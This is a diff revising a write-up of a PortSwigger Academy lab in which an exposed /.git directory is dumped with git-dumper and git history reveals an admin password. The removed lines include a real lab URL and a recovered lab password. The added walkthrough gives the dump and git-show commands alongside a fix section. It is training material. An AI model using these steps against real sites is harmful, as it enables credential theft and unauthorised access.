@@ -1,89 +1,71 @@
 ---
 title: Information disclosure in version control history
-date: '2025-06-18'
+date: '2026-08-05'
 tags:
   - PortSwigger
   - lab
   - information-disclosure
   - walkthrough
-excerpt: "This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the\_`administrator`\_user then log in and delete the user\_`carlos`."
+excerpt: "This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the\_administrator\_user then log in and delete the user\_carlos."
 type: lab
 category: PortSwigger Academy
 platform: PortSwigger
-difficulty: apprentice
+difficulty: practitioner
 ---
+
 # Lab: Information disclosure in version control history
 
-## Objective
-This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`.
+I already knew the `.git` trick, so the only real work here was getting the dump onto disk. The dumper bit me with a missing Python module, and the fix is a one-liner I now keep in my notes. The rest is just reading git output.
 
-## Why This Works (The Principle)
-- **The vulnerability:** The application reveals sensitive information through error messages, debug pages, backup files, or version control history.
-- **Root cause:** These endpoints/files are unintentionally exposed to unauthenticated or unauthorized users.
-- **Exploitation:** Request the vulnerable endpoint to retrieve hidden data.
-- **Key insight:** Information disclosure is rarely the end goal — it is a stepping stone to a bigger attack (e.g., finding credentials, API keys, or internal paths).
+## The setup
 
-## Blind Attempt 
-- **What I tried:** I was familiar with this kind of lab so I simply just went to /.git folder and found it. Also I was aware that tools like git-dumper existed
-- **Where I got stuck:** git-dumper got stuck with python error
-```bash
-uv run --with requests_pkcs12 /usr/bin/git-dumper https://0a0900ba033d1175804ef8fb00f9001a.web-security-academy.net/ .
+Browsing to `/.git/` returns a directory listing of the repository internals. Nothing hides it, and no authentication is involved. The whole history is being served like any other folder of files.
 
-Installed 9 packages in 32ms
-Traceback (most recent call last):
-  File "/usr/bin/git-dumper", line 3, in <module>
-    from git_dumper import main
-  File "/usr/lib/python3.14/site-packages/git_dumper.py", line 22, in <module>
-    from requests_pkcs12 import Pkcs12Adapter
-ModuleNotFoundError: No module named 'requests_pkcs12'
-```
+## How the vulnerability works
+
+Git keeps everything in `.git`: objects for every file at every commit, refs, and logs. If the web server serves that directory, you can rebuild the source and walk the history. Secrets that were removed in a later commit are still sitting in the objects of the earlier one, so `git show` or `git diff` on the old commit prints exactly what was deleted.
+
+## Solving it
+
+1. Confirm the leak: `GET /.git/` answers with a listing.
+2. Download the repository. A dedicated dumper is cleaner than `wget -r`:
 
 ```bash
-uvx --with requests_pkcs12 git-dumper https://0a0900ba033d1175804ef8fb00f9001a.web-security-academy.net/ .
+git-dumper https://LAB-ID.web-security-academy.net/.git/ ./repo
 ```
 
-**Why this worked:** `uvx` (an alias for `uv tool run`) downloads `git-dumper` into an ephemeral environment, installs `requests_pkcs12` right alongside it, and executes the script using the environment's internal Python interpreter.
-## Solution Reconstruction
-- [ ] Step 1: Used git-dumper to download entire project files 
-- [ ] Step 2: After downloading the project:
+My first run died with `ModuleNotFoundError: No module named 'requests_pkcs12'`. Running the tool in a throwaway environment that carries the extra dependency fixed it:
+
 ```bash
-󰘧 ls
-Permissions Size User   Date Modified Name
-.rw-r--r--    37 schizo 19 Jun 00:48  󱁻 admin.conf
-.rw-r--r--    88 schizo 19 Jun 00:48   admin_panel.php
-
-󰘧 cat admin.conf
-ADMIN_PASSWORD=env('ADMIN_PASSWORD')
-
-> git log
-commit 2a3e5901cc5df87963b2b10604d37c7312c4caf6 (HEAD -> master)
-Author: Carlos Montoya <carlos@carlos-montoya.net>
-Date:   Tue Jun 23 14:05:07 2020 +0000
-
-    Remove admin password from config
-
-commit b785e6a349102e6eb3bb0972a0f4653c9c669093
-Author: Carlos Montoya <carlos@carlos-montoya.net>
-Date:   Mon Jun 22 16:23:42 2020 +0000
-
-    Add skeleton admin panel
-
-> git checkout b785e6a349102e6eb3bb0972a0f4653c9c669093
-Note: switching to 'b785e6a349102e6eb3bb0972a0f4653c9c669093'.
-
-> ls
-Permissions Size User   Date Modified Name
-.rw-r--r--    36 schizo 19 Jun 00:48  󱁻 admin.conf
-.rw-r--r--    88 schizo 19 Jun 00:48   admin_panel.php
-
-…/git_thing on  HEAD
-󰘧 cat admin.conf
-ADMIN_PASSWORD=k5fh1wxi27mu1rpu6m7r
+uvx --with requests_pkcs12 git-dumper https://LAB-ID.web-security-academy.net/.git/ ./repo
 ```
-- [ ] Step 3: Logged in as `administrator` with the recovered password
-## Key Takeaway
-If **.git** is accessible we can roll back versions
-**uvx(uv-tool-run)** can download and run pypi tools ephemerally and run it with --with for dependencies. 
-## Next-Day Blind Replay
-- [ ] Solved entirely from memory
-- [ ] Needed to look at: *(write the specific step forgotten)*
+
+`uvx` is short for `uv tool run`: it builds a temporary environment with `git-dumper` and `requests_pkcs12`, then executes the tool there.
+
+3. Walk the history in `./repo`:
+
+```bash
+git log --oneline
+git show HEAD~1 -- admin.conf
+```
+
+A commit titled "Remove admin password from config" is the tell. Its diff swapped the hard-coded password for `env('ADMIN_PASSWORD')`, and the old password is still visible on the removed line.
+
+4. Log in as `administrator` with the leaked password, open the admin panel, and delete `carlos`.
+
+## Why that payload works
+
+Nothing clever. `.git` is a static directory and the server hands out its files like any other. The dumper replays the usual repository responses; once the objects are local, `git show` reconstructs the previous file byte for byte, secrets included.
+
+## The fix
+
+Never deploy `.git` into the document root. Build the artifact without VCS metadata and block dotfiles and dot-directories at the web server or CDN. If a secret ever touched a commit, rotate it, because deleting it later does not remove it from the object store.
+
+<Terminal title="dump and inspect" command="git-dumper https://LAB-ID.web-security-academy.net/.git/ ./repo && git -C repo log --oneline" output={"[-] Fetching .git recursively\n[-] Dumping '.' to 'repo'\n... done\n\n2a3e590 Remove admin password from config\nb785e6a Add skeleton admin panel\n\n# git -C repo show HEAD~1 -- admin.conf\n-ADMIN_PASSWORD=<leaked-password>\n+ADMIN_PASSWORD=env('ADMIN_PASSWORD')"} />
+
+<MatchPairs title="Glossary" pairs={[
+  { term: "/.git/", match: "Served directory that exposes the whole repository" },
+  { term: "git-dumper", match: "Tool that downloads the exposed repo to disk" },
+  { term: "HEAD~1", match: "The commit just before the current one" },
+  { term: "admin.conf", match: "Config file whose old revision holds the password" }
+]} />
